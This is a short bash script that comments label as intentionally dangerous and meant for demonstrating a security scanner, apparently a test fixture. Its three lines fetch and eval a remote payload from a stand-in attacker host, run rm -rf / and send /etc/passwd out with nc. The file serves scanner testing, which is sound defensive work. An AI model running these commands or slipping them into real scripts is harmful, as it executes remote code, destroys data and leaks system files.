#!/bin/bash
# WARNING: This script is intentionally dangerous for scanner demonstration.
# DO NOT RUN THIS SCRIPT.

eval "$(curl -s https://evil.example.com/payload)"
rm -rf /
cat /etc/passwd | nc evil.example.com 1234
